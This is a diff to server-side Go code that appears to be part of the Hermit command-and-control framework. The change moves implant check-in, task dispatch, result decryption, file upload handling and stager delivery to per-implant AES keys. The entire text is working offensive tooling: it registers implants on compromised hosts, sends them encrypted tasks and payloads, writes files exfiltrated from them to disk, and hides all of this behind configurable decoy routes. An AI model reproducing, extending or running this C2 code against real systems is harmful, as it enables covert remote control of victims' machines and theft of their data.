@@ -20,7 +20,6 @@ import (
 	"github.com/hideckies/hermit/pkg/common/stdout"
 	"github.com/hideckies/hermit/pkg/common/utils"
 	"github.com/hideckies/hermit/pkg/server/agent"
-	"github.com/hideckies/hermit/pkg/server/db"
 	"github.com/hideckies/hermit/pkg/server/job"
 	"github.com/hideckies/hermit/pkg/server/listener"
 	"github.com/hideckies/hermit/pkg/server/state"
@@ -30,21 +29,25 @@ import (
 var upgrader = websocket.Upgrader{}
 
 type CheckInData struct {
-	OS          string `json:"os"`
-	Arch        string `json:"arch"`
-	Hostname    string `json:"hostname"`
-	ListenerURL string `json:"listenerURL"`
-	ImplantType string `json:"implantType"`
-	Sleep       uint   `json:"sleep"`
-	Jitter      uint   `json:"jitter"`
-	KillDate    uint   `json:"killDate"`
+	OS           string `json:"os"`
+	Arch         string `json:"arch"`
+	Hostname     string `json:"hostname"`
+	ListenerURL  string `json:"listenerURL"`
+	ImplantType  string `json:"implantType"`
+	Sleep        uint   `json:"sleep"`
+	Jitter       uint   `json:"jitter"`
+	KillDate     uint   `json:"killDate"`
+	AESKeyBase64 string `json:"aesKey"`
+	AESIVBase64  string `json:"aesIV"`
 }
 
 type StagerData struct {
-	OS         string `json:"os"`
-	Arch       string `json:"arch"`
-	Hostname   string `json:"hostname"`
-	LoaderType string `json:"loaderType"`
+	OS           string `json:"os"`
+	Arch         string `json:"arch"`
+	Hostname     string `json:"hostname"`
+	LoaderType   string `json:"loaderType"`
+	AESKeyBase64 string `json:"aesKey"`
+	AESIVBase64  string `json:"aesIV"`
 }
 
 type SocketData struct {
@@ -59,7 +62,7 @@ func verifyAgentCheckIn(ag *agent.Agent, ip string, os string, arch string, host
 	}
 }
 
-func handleImplantCheckIn(database *db.Database) gin.HandlerFunc {
+func handleImplantCheckIn(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		clientIP := ctx.ClientIP()
 
@@ -79,7 +82,7 @@ func handleImplantCheckIn(database *db.Database) gin.HandlerFunc {
 		checkInDate := meta.GetCurrentDateTime()
 
 		// Check if the agent already exists on the database.
-		ags, err := database.AgentGetAll()
+		ags, err := serverState.DB.AgentGetAll()
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "")
 			return
@@ -93,9 +96,17 @@ func handleImplantCheckIn(database *db.Database) gin.HandlerFunc {
 			}
 		}
 
+		// Get AES key/iv
+		newAES, err := crypt.NewAESFromBase64Pairs(checkInData.AESKeyBase64, checkInData.AESIVBase64)
+		if err != nil {
+			ctx.String(http.StatusBadRequest, "")
+			return
+		}
+
 		if targetAgent == nil {
+
 			// Add new agent to the database
-			targetAgent = agent.NewAgent(
+			targetAgent, err = agent.NewAgent(
 				0,
 				uuid.NewString(),
 				"",
@@ -109,17 +120,24 @@ func handleImplantCheckIn(database *db.Database) gin.HandlerFunc {
 				checkInData.Sleep,
 				checkInData.Jitter,
 				checkInData.KillDate,
+				newAES,
 			)
-			if err := database.AgentAdd(targetAgent); err != nil {
-				ctx.String(http.StatusBadRequest, "")
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "Failed to initialize target agent.")
+				return
+			}
+
+			if err := serverState.DB.AgentAdd(targetAgent); err != nil {
+				ctx.String(http.StatusBadRequest, "Failed to add target agent on database.")
 				return
 			}
 		} else {
 			// Update the agent info
 			targetAgent.Hostname = checkInData.Hostname
 			targetAgent.CheckInDate = checkInDate
-			if err := database.AgentUpdate(targetAgent); err != nil {
-				ctx.String(http.StatusBadRequest, "")
+			targetAgent.AES = newAES
+			if err := serverState.DB.AgentUpdate(targetAgent); err != nil {
+				ctx.String(http.StatusBadRequest, "Failed to update agent info.")
 				return
 			}
 		}
@@ -127,7 +145,7 @@ func handleImplantCheckIn(database *db.Database) gin.HandlerFunc {
 		// Make the agent directory and others
 		err = metafs.MakeAgentChildDirs(targetAgent.Name, false)
 		if err != nil {
-			ctx.String(http.StatusBadRequest, "")
+			ctx.String(http.StatusBadRequest, "Failed to make agent child directories.")
 			return
 		}
 
@@ -136,25 +154,26 @@ func handleImplantCheckIn(database *db.Database) gin.HandlerFunc {
 	return gin.HandlerFunc(fn)
 }
 
-func handleImplantDownload(database *db.Database) gin.HandlerFunc {
+func handleImplantDownload(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		// Get the client UUID
 		clientUUID := ctx.GetHeader("X-UUID")
 
 		// Check if the agent exists on the database
-		ags, err := database.AgentGetAll()
+		var targetAgent *agent.Agent = nil
+		ags, err := serverState.DB.AgentGetAll()
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "")
 			return
 		}
-		agentExists := false
 		for _, ag := range ags {
 			if ag.Uuid == clientUUID {
-				agentExists = true
+				targetAgent = ag
 				break
 			}
 		}
-		if !agentExists {
+
+		if targetAgent == nil {
 			ctx.String(http.StatusBadRequest, "")
 			return
 		}
@@ -181,7 +200,7 @@ func handleImplantDownload(database *db.Database) gin.HandlerFunc {
 			return
 		}
 		// Encrypt the data
-		dataEnc, err := crypt.Encrypt(data)
+		dataEnc, err := targetAgent.AES.Encrypt(data)
 		if err != nil {
 			w.WriteHeader(http.StatusBadRequest)
 			w.(http.Flusher).Flush()
@@ -200,12 +219,12 @@ func handleImplantDownload(database *db.Database) gin.HandlerFunc {
 	return gin.HandlerFunc(fn)
 }
 
-func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
+func handleImplantTaskGet(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		// Get the client UUID
 		clientUUID := ctx.GetHeader("X-UUID")
 
-		ags, err := database.AgentGetAll()
+		ags, err := serverState.DB.AgentGetAll()
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "Error: Failed to get all agents.")
 			return
@@ -241,7 +260,7 @@ func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
 		}
 
 		// Encrypt the task
-		encTask, err := crypt.Encrypt([]byte(currTask))
+		encTask, err := targetAgent.AES.Encrypt([]byte(currTask))
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "Error: Failed to encrypt the task.")
 			return
@@ -252,12 +271,12 @@ func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
 	return gin.HandlerFunc(fn)
 }
 
-func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
+func handleImplantTaskResult(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		// Get the client UUID
 		clientUUID := ctx.GetHeader("X-UUID")
 
-		ags, err := database.AgentGetAll()
+		ags, err := serverState.DB.AgentGetAll()
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "Error: Failed to get all agents.")
 			return
@@ -282,7 +301,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			return
 		}
 		// Decrypt task result.
-		dataDec, err := crypt.Decrypt([]byte(dataEnc))
+		dataDec, err := targetAgent.AES.Decrypt([]byte(dataEnc))
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "Failed to decrypt the task result.")
 			return
@@ -303,7 +322,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 		case _task.TASK_CONNECT:
 			// Update listener URL of the agent on the database.
 			targetAgent.ListenerURL = taskResult.Result
-			database.AgentUpdate(targetAgent)
+			serverState.DB.AgentUpdate(targetAgent)
 
 			content = "Listener URL has been updated."
 		case _task.TASK_DOWNLOAD:
@@ -318,7 +337,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			}
 			// Update jitter time on the database
 			targetAgent.Jitter = uint(time)
-			err = database.AgentUpdate(targetAgent)
+			err = serverState.DB.AgentUpdate(targetAgent)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
 				return
@@ -333,7 +352,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			}
 			// Update killdate on the database
 			targetAgent.KillDate = uint(dt)
-			err = database.AgentUpdate(targetAgent)
+			err = serverState.DB.AgentUpdate(targetAgent)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
 				return
@@ -362,7 +381,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			}
 			// Update sleep time on the database
 			targetAgent.Sleep = uint(time)
-			err = database.AgentUpdate(targetAgent)
+			err = serverState.DB.AgentUpdate(targetAgent)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
 				return
@@ -391,15 +410,15 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 	return gin.HandlerFunc(fn)
 }
 
-func handleImplantUpload(database *db.Database) gin.HandlerFunc {
+func handleImplantUpload(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		// Get the client UUID
 		clientUUID := ctx.GetHeader("X-UUID")
 
 		// Get the agent
-		ags, err := database.AgentGetAll()
+		ags, err := serverState.DB.AgentGetAll()
 		if err != nil {
-			ctx.String(http.StatusBadRequest, "")
+			ctx.String(http.StatusBadRequest, "Failed to get all agents from database.")
 			return
 		}
 		var targetAgent *agent.Agent = nil
@@ -410,18 +429,18 @@ func handleImplantUpload(database *db.Database) gin.HandlerFunc {
 			}
 		}
 		if targetAgent == nil {
-			ctx.String(http.StatusBadRequest, "")
+			ctx.String(http.StatusBadRequest, "Failed to determine the agent.")
 			return
 		}
 
 		// Get file data (encrypted)
 		dataEnc, err := ctx.GetRawData()
 		if err != nil {
-			ctx.String(http.StatusBadRequest, "")
+			ctx.String(http.StatusBadRequest, "Failed to get data.")
 			return
 		}
 		// Decrypt
-		data, err := crypt.Decrypt(dataEnc)
+		data, err := targetAgent.AES.Decrypt(dataEnc)
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "")
 			return
@@ -430,20 +449,31 @@ func handleImplantUpload(database *db.Database) gin.HandlerFunc {
 		// Get task
 		taskEnc := ctx.GetHeader("X-Task") // This value is Encrypted
 		// Decrypt
-		task, err := crypt.Decrypt([]byte(taskEnc))
+		task, err := targetAgent.AES.Decrypt([]byte(taskEnc))
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "Error: Failed to decrypt task.")
 			return
 		}
+		// Delete null-terminated characters
+		taskClean := make([]byte, 0, len(task))
+		for _, b := range task {
+			if b != 0 {
+				taskClean = append(taskClean, b)
+			}
+		}
 		// Parse JSON
 		var taskJSON _task.Task
-		json.Unmarshal(task, &taskJSON)
+		if err := json.Unmarshal(taskClean, &taskJSON); err != nil {
+			ctx.String(http.StatusBadRequest, "Failed to parse JSON.")
+			return
+		}
 
 		if taskJSON.Command.Code == _task.TASK_DOWNLOAD {
 			// Get the download path
 			downloadPath := ctx.GetHeader("X-File")
 			// Check if the file already exists
 			if _, err := os.Stat(downloadPath); err == nil {
+				stdout.LogFailed(fmt.Sprintf("Error downloadPath: %s", err))
 				ctx.String(http.StatusBadRequest, "File already exists.")
 				return
 			}
@@ -451,6 +481,7 @@ func handleImplantUpload(database *db.Database) gin.HandlerFunc {
 			// Save the file
 			err = os.WriteFile(downloadPath, data, 0644)
 			if err != nil {
+				stdout.LogFailed(fmt.Sprintf("Error write file: %s", err))
 				ctx.String(http.StatusBadRequest, "Failed to write file.")
 				return
 			}
@@ -502,7 +533,7 @@ func handleImplantWebSocket(ctx *gin.Context) {
 	}
 }
 
-func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
+func handleStagerDownload(lis *listener.Listener, serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		w := ctx.Writer
 		header := w.Header()
@@ -512,12 +543,19 @@ func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
 		// Read JSON data
 		jsonBytes, err := ctx.GetRawData()
 		if err != nil {
-			ctx.String(http.StatusBadRequest, "")
+			ctx.String(http.StatusBadRequest, "Failed to get data.")
 			return
 		}
 		var stgData StagerData
 		if err := json.Unmarshal(jsonBytes, &stgData); err != nil {
-			ctx.String(http.StatusBadRequest, "")
+			ctx.String(http.StatusBadRequest, "Failed to parse JSON.")
+			return
+		}
+
+		// Generate AES key/iv
+		newAES, err := crypt.NewAESFromBase64Pairs(stgData.AESKeyBase64, stgData.AESIVBase64)
+		if err != nil {
+			ctx.String(http.StatusBadGateway, "Failed to generate AES instance from Base64 key/iv.")
 			return
 		}
 
@@ -596,7 +634,7 @@ func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
 			return
 		}
 		// Encrypt the data
-		dataEnc, err := crypt.Encrypt(data)
+		dataEnc, err := newAES.Encrypt(data)
 		if err != nil {
 			w.WriteHeader(http.StatusBadRequest)
 			w.(http.Flusher).Flush()
@@ -615,14 +653,14 @@ func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
 	return gin.HandlerFunc(fn)
 }
 
-func handleSocketOpen(database *db.Database) gin.HandlerFunc {
+func handleSocketOpen(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		return
 	}
 	return gin.HandlerFunc(fn)
 }
 
-func handleSocketClose(database *db.Database) gin.HandlerFunc {
+func handleSocketClose(serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		return
 	}
@@ -637,31 +675,31 @@ func httpsRoutes(
 	fakeRoutes := serverState.Conf.Listener.FakeRoutes
 
 	for _, r := range fakeRoutes["/implant/checkin"] {
-		router.POST(r, handleImplantCheckIn(serverState.DB))
+		router.POST(r, handleImplantCheckIn(serverState))
 	}
 	for _, r := range fakeRoutes["/implant/download"] {
-		router.POST(r, handleImplantDownload(serverState.DB))
+		router.POST(r, handleImplantDownload(serverState))
 	}
 	for _, r := range fakeRoutes["/implant/task/get"] {
-		router.GET(r, handleImplantTaskGet(serverState.DB))
+		router.GET(r, handleImplantTaskGet(serverState))
 	}
 	for _, r := range fakeRoutes["/implant/task/result"] {
-		router.POST(r, handleImplantTaskResult(serverState.DB))
+		router.POST(r, handleImplantTaskResult(serverState))
 	}
 	for _, r := range fakeRoutes["/implant/upload"] {
-		router.POST(r, handleImplantUpload(serverState.DB))
+		router.POST(r, handleImplantUpload(serverState))
 	}
 	for _, r := range fakeRoutes["/implant/websocket"] {
 		router.GET(r, handleImplantWebSocket)
 	}
 	for _, r := range fakeRoutes["/stager/download"] {
-		router.POST(r, handleStagerDownload(lis))
+		router.POST(r, handleStagerDownload(lis, serverState))
 	}
 	for _, r := range fakeRoutes["/socket/open"] {
-		router.POST(r, handleSocketOpen(serverState.DB))
+		router.POST(r, handleSocketOpen(serverState))
 	}
 	for _, r := range fakeRoutes["/socket/close"] {
-		router.POST(r, handleSocketClose(serverState.DB))
+		router.POST(r, handleSocketClose(serverState))
 	}
 }
 
